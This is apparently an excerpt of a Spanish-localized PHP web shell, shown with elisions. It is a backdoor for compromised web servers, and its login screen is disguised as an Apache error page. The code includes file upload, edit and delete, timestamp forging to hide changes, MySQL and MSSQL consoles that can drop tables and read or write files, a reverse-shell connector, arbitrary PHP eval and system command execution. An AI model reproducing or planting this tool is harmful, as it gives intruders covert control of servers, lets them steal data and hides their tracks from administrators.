...
$admin = array();
$admin['check'] = true;
$admin['pass']  = 'bdceca218fb8945fbfc8382dfc265151';
$admin['cookiepre'] = '';
$admin['cookiedomain'] = '';
$admin['cookiepath'] = '/';
...
if ($action == "logout") {
	...
	p('<a style="font:12px Verdana" href="'.$self.'">Adios, no vuelvas!!</a>');
	exit;
}
if($admin['check']) {
	if ($doing == 'login') {
		if ($admin['pass'] == md5($password)) {
			...
			p('<meta http-equiv="refresh" content="1;URL='.$self.'">');
			p('<a style="font:12px Verdana" href="'.$self.'">Ingresando...</a>');
			exit;
		}
	}
...
if ($action == 'phpinfo') {
	if (IS_PHPINFO) {
		...
		$errmsg = 'phpinfo() no esta habilitado';
	}
}
...
if ($doing == 'downfile' && $thefile) {
	if (!@file_exists($thefile)) {
		$errmsg = 'El archivo que desea descargar no existe';
	} else {
...
if (!$action || $action == 'file') {
	...
	if ($doing == 'deldir' && $thefile) {
		if (!file_exists($thefile)) {
			m($thefile.' El directorio no existe');
		} else {
			m('Borrado '.(deltree($thefile) ? basename($thefile).' exitoso' : 'fallido'));
		}
	}
	...
	elseif ($newdirname) {
		...
		if (file_exists($mkdirs)) {
			m('El directorio ya existe');
		} else {
			m('Directorio creado '.(@mkdir($mkdirs,0777) ? 'exitoso' : 'fallido'));
			@chmod($mkdirs,0777);
		}
	}

	elseif ($doupfile) {
		m('Upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'exitoso' : 'fallido'));
	}

	elseif ($editfilename && $filecontent) {
		$fp = @fopen($editfilename,'w');
		m('Guardado '.(@fwrite($fp,$filecontent) ? 'exitoso' : 'fallido'));
		@fclose($fp);
	}

	elseif ($pfile && $newperm) {
		if (!file_exists($pfile)) {
			m('El archivo original no existe');
		} else {
			$newperm = base_convert($newperm,8,10);
			m('Modificar atributos '.(@chmod($pfile,$newperm) ? 'exitoso' : 'fallido'));
		}
	}
	...
	elseif ($oldname && $newfilename) {
		...
		if (file_exists($nname) || !file_exists($oldname)) {
			...
			m(basename($oldname).' renombrado '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));
		}
	}
	...
	elseif ($curfile && $tarfile) {
		if (!@file_exists($curfile) || !@file_exists($tarfile)) {
			...
			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'exitoso' : 'fallido'));
		}
	}
	...
	p('<h2>Archivos// - Espacio en disco '.sizecount($free).' of '.sizecount($all).' ('.$used_percent.'%)</h2>');
...
function createdir(){
	var newdirname;
	newdirname = prompt('Ingrese el nombre del directorio:', '');
...
function fileperm(pfile){
	var newperm;
	newperm = prompt('Archivo:'+pfile+'\nIngrese los nuevos atributos:', '');
	if (!newperm) return;
...
function copyfile(sname){
	var tofile;
	tofile = prompt('Ruta actual:'+sname+'\nIngrese la ruta donde se copiara:', '');
	if (!tofile) return;
...
function rename(oldname){
	var newfilename;
	newfilename = prompt('Nombre actual:'+oldname+'\nIngrese un nuevo nombre:', '');
...
function getsize(getdir,dir){
  ...
  <?php
	...
	p(' | <a href="javascript:godir(\'.\');">Ruta Shell</a>');
	p(' | <a href="javascript:godir(\''.$nowpath.'\');">Ver todo</a>');
	p(' | View Writable ( <a href="javascript:godir(\''.$nowpath.'\',\'dir\');">Directorio</a>');
	p(' | <a href="javascript:godir(\''.$nowpath.'\',\'file\');">Archivo</a> )');
	p(' | <a href="javascript:createdir();">Crear Directorio</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Crear Archivo</a>');
	if (IS_WIN && IS_COM) {
		$obj = new COM('scripting.filesystemobject');
		if ($obj && is_object($obj) && is_array($obj->Drives)) {
			$DriveTypeDB = array(0 => 'Unknown',1 => 'Removible',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');
			foreach($obj->Drives as $drive) {
				if ($drive->DriveType == 2) {
					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Size:'.sizecount($drive->TotalSize).'&#13;Libre:'.sizecount($drive->FreeSpace).'&#13;Tipo:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
				} else {
					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Tipo:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
				}
			}
		}
	}
	p('<br /><form action="'.$self.'" method="POST">Buscar texto en archivos: <input class="input" name="findstr" value="'.$findstr.'" type="text" /> <input class="bt" value="Buscar" type="submit" /> Extension: <input class="input" name="writabledb" value="'.$writabledb.'" type="text" /><input name="dir" value="'.$dir.'" type="hidden" /> <input name="re" value="1" type="checkbox" '.($re ? 'checked' : '').' /> Expresiones regulares</form></td></tr>');
	p('<tr class="head"><td>&nbsp;</td><td>Nombre</td><td width="16%">Ultima modificacion</td><td width="10%">Size</td><td width="20%">Chmod / Permiso</td><td width="22%">Acciones</td></tr>');
	...
	foreach($dirdata as $key => $dirdb){
		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
			if($getdir && $getdir == $dirdb['server_link']) {
				...
				$attachsize = '<a href="javascript:getsize(\''.$dirdb['server_link'].'\',\''.$dir.'\');">Calcular</a>';
			}
			$thisbg = bg();
			...
			p('<td nowrap><a href="javascript:dofile(\'deldir\',\''.$dirdb['server_link'].'\',\'Esta seguro de borrar <'.$dirdb['filename'].'>? \\n\\nSi el directorio no esta vacio, todos los archivos se borraran.\')">Borrar</a> | <a href="javascript:rename(\''.$dirdb['server_link'].'\');">Renombrar</a></td>');
			p('</tr>');
			$dir_i++;
		} else {
			if($dirdb['filename']=='..') {
	...
	foreach($filedata as $key => $filedb){
		if($filedb['filename']!='..' && $filedb['filename']!='.') {
			...
			p('<td nowrap>');
			p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Descargar</a> | ');
			p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copiar</a> | ');
			p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Editar</a> | ');
			p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Renombrar</a> | ');
			p('<a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Tiempo</a>');
			p('</td></tr>');
			$file_i++;
		}
	}
	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Descargar seleccionados</a> - <a href="javascript:dofile(\'delfiles\');">Borrar seleccionados</a></td><td colspan="4" align="right">'.$dir_i.' directorios / '.$file_i.' archivos</td></tr>');
	p('</form></table>');
}// end dir
	...
	if($doing=="mysqlupload"){
		...
		if (file_exists($savepath)) {
			...
			if(!$filename) {
				...
				m($result ? 'Subida con exito' : 'Subida fallida: '.mysql_error());
			}
		}
	}
?>
...
<?php
	...
	p('<h2>Subir archivo</h2>');
	p('<p><b>Para realizar esto el usuario DB debe tener privilegios FILE</b></p>');
	p('<p>Ruta guardado: <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
	p('<h2>Descargar archivo</h2>');
	p('<p>Archivo: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Descargar</a></p>');
	makehide('dbhost');
	makehide('dbport');
	makehide('dbuser');
	makehide('dbpass');
...
elseif ($action == 'mysqladmin') {
	...
	if ($doing == 'backupmysql' && $saveasfile) {
		if (!$table) {
			...
			if ($fp) {
				...
				m('Backup creado en <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
				mysql_close();
			} else {
				m('Backup fallido');
			}
	...
	if ($insert && $insertsql) {
		...
		if ($keystr && $valstr) {
			mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Ingrese nuevo registro' : mysql_error());		}
	}
	if ($update && $insertsql && $base64) {
		...
		if ($valstr) {
			...
			mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Actualizando registro' : mysql_error());
		}
	}
	if ($doing == 'del' && $base64) {
		$where = base64_decode($base64);
		...
		mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		m(q("DELETE FROM $tablename WHERE $where") ? 'Borrando registro' : mysql_error());
	}

	if ($tablename && $doing == 'drop') {
		mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		if (q("DROP TABLE $tablename")) {
			m('Drop table exitoso');
			$tablename = '';
		} else {
			m(mysql_error());
		}
	...
	p('DBCharset:');
	makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
	makeinput(array('name'=>'connect','value'=>'Conectar','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();
?>
<script type="text/javascript">
...
<?php
	...
	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
		...
		p('<p>MySQL '.$mysqlver.' ejecutandose en '.$dbhost.' como '.$dbuser.'@'.$dbhost.'</p>');
		$highver = $mysqlver > '4.1' ? 1 : 0;

		$query = q("SHOW DATABASES");
		$dbs = array();
		$dbs[] = '-- Seleccione una database --';
		while($db = mysql_fetch_array($query)) {
			$dbs[$db['Database']] = $db['Database'];
		}
		makeselect(array('title'=>'Seleccione una database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
		$tabledb = array();
		if ($dbname) {
			p('<p>');
			p('Database: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
			if ($tablename) {
				p(' | Tabla actual: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
			}
			p('</p>');
			...
			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Ejecutar Query SQL'.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Ejecutar" /></td></tr></table></p>');
			...
			if ($tablename || ($runquery && $sql_query)) {
				if ($doing == 'structure') {
					...
					if ($doing == 'insert') {
						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insertar" /></td></tr>');
					} else {
						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="update" value="Actualizar" /></td></tr>');
							...
							switch(qy($query))
							{
								...
								case 1:
									...
									while($mn = @mysql_fetch_assoc($result)){
										...
										if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Editar</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Borrar</a></td>');
								...
								case 2:
									...
									p('<h2>Columnas afectadas : <b>'.$ar.'</b></h2>');
									break;
							}
						}
					}
				...
				foreach ($tabledb as $key => $table) {
					...
					p('<td><a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insertar</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Estructura</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a></td>');
					p('</tr>');
				}
				p('<tr class='.bg().'>');
				p('<td>&nbsp;</td>');
				p('<td>Total tablas: '.$table_num.'</td>');
				p('<td>'.$table_rows.'</td>');
				p('<td>'.$data_size.'</td>');
				p('<td colspan="'.($highver ? 5 : 3).'">&nbsp;</td>');
				p('</tr>');

				p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Guardar como <input class=\"input\" name=\"path\" value=\"".SA_ROOT.$_SERVER['HTTP_HOST']."_MySQL.sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" name=\"downrar\" value=\"Exportar seleccionadas\" /></td></tr>");
...
elseif ($action == 'mssqladmin') {
	...
	if ($insert && $insertsql) {
		...
		if ($keystr && $valstr) {
			...
			m(msq("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Ingrese nuevo registro' : msmsg());
		}
	}
	if ($update && $insertsql && $base64) {
		$valstr = $tmp = '';
		...
		if ($valstr) {
			$where = base64_decode($base64);
			msdbconn($dbhost,$dbuser,$dbpass,$dbname);
			m(msq("UPDATE $tablename SET $valstr WHERE $where") ? 'Actualizando registro' : msmsg());
		}
	}
	if ($doing == 'del' && $base64) {
		$where = base64_decode($base64);
		$delete_sql = "DELETE FROM $tablename WHERE $where";
		msdbconn($dbhost,$dbuser,$dbpass,$dbname);
		m(msq("DELETE FROM $tablename WHERE $where") ? 'Borrando registro' : msmsg());
	}
...
<?php
	...
	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
		...
		if ($msinfo[0]) {
			$issa = 1;
			echo '<h3>Eres sysadmin!</h3>';
		}
		//&#65533;&#65533;&#545;&#65533;&#65533;&#1919;&#65533;
		$query = msq("SELECT name FROM master.dbo.sysdatabases WHERE has_dbaccess(name) = 1 ORDER BY name");
		$dbs = array();
		$dbs[] = '-- Seleccione una DB --';
		while($db = mssql_fetch_array($query)) {
			$dbs[$db['name']] = $db['name'];
		}
		makeselect(array('title'=>'Seleccione la DB:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
		$tabledb = array();
		if ($dbname) {
			p('<p>');
			p('Database: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a> [ <a href="javascript:mssqlinfo(\''.$dbname.'\');">information</a> ]');
			if ($tablename) {
				p(' | Tabla actual: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
			}
			p('</p>');
...
elseif ($action == 'backconnect') {
	...
	if ($start && $yourip && $yourport && $use){
		...
		m("Intentando conectarse a $yourip puerto $yourport ...");
	}

	formhead(array('title'=>'Shell inversa'));
	...
	makeinput(array('name'=>'start','value'=>'Conectar','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();
}//end sql backup
...
elseif ($action == 'eval') {
	...
	formhead(array('title'=>'Ejecutar PHP'));
	makehide('action','eval');
	maketext(array('title'=>'Ejecutar PHP','name'=>'phpcode', 'value'=>$phpcode));
		formfooter();
}//end eval
...
elseif ($action == 'editfile') {
	...
	formhead(array('title'=>'Crear/Editar'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Archivo actual (importar)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
	maketext(array('title'=>'Contenido','name'=>'filecontent','value'=>$contents));
	formfooter();
...
elseif ($action == 'newtime') {
	...
	//$time = strtotime("$year-$month-$day $hour:$minute:$second");
	$cachemonth = array('Enero'=>1,'Febrero'=>2,'Marzo'=>3,'Abril'=>4,'Mayo'=>5,'Junio'=>6,'Julio'=>7,'Agosto'=>8,'Septiembre'=>9,'Octubre'=>10,'Noviembre'=>11,'Diciembre'=>12);
	formhead(array('title'=>'Archivo clonado con fecha'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Alterar archivo','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	makeinput(array('title'=>'Referencia (ruta)','name'=>'tarfile','size'=>120,'newline'=>1));
	formfooter();
	formhead(array('title'=>'Fecha Modificado'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Archivo actual (ruta)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	p('<p>Instead &raquo;');
	p('A&#65533;o:');
...
elseif ($action == 'shell') {
	if (IS_WIN && IS_COM) {
		...
		formhead(array('title'=>'Ejecutar programa'));
	...
	formhead(array('title'=>'Ejecutar comando'));
	makehide('action','shell');
	if (IS_WIN && IS_COM) {
	...
	p('<p>');
	makeinput(array('title'=>'Comando','name'=>'command','value'=>htmlspecialchars($command)));
	makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Ejecutar'));
	p('</p>');
	formfoot();
...
elseif ($action == 'phpenv') {
	...
	$info = array(
		1 => array('Hora Servidor',date('Y/m/d h:i:s',$timestamp)),
		2 => array('Dominio Servidor',$_SERVER['SERVER_NAME']),
		3 => array('IP Servidor',gethostbyname($_SERVER['SERVER_NAME'])),
		4 => array('OS Servidor',PHP_OS),
		5 => array('OS Charset Servidor',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		6 => array('Software Servidor',$_SERVER['SERVER_SOFTWARE']),
		7 => array('Web Port',$_SERVER['SERVER_PORT']),
		8 => array('Modo de PHP',strtoupper(php_sapi_name())),
		9 => array('Ruta Shell',__FILE__),
	...
	formhead(array('title'=>'Entorno servidor'));
	makehide('action','phpenv');
	makeinput(array('title'=>'Ingrese un parametro PHP(ej:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
	formfooter();
...
function multi($num, $perpage, $curpage, $tablename) {
	...
	if($num > $perpage) {
		...
		$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">Primera</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Anterior</a> ' : '');
		for($i = $from; $i <= $to; $i++) {
			$multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
		}
		$multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Siguiente</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Ultima</a>' : '');
...
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
	...
	<span style="font:11px Verdana;"></span><input name="password" type="password" size="20">
...
function debuginfo() {
	...
	echo 'Procesado en '.$totaltime.' segundo(s)';
}
...
function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
	...
	if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
		p('<h2>No se pudo conectar a MySQL server</h2>');
		exit;
	}
	if($link && $dbname) {
		if (!@mysql_select_db($dbname, $link)) {
			p('<h2>Database seleccionada con errores</h2>');
			exit;
		}
	}
...
function formfooter($name = ''){
	!$name && $name = 'submit';
	p('<p><input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Enviar"></p>');
	p('</form>');
}

function goback(){
	global $self, $nowpath;
	p('<form action="'.$self.'" method="post"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="'.$nowpath.'" /><p><input class="bt" type="submit" value="Regresar..."></p></form>');
}
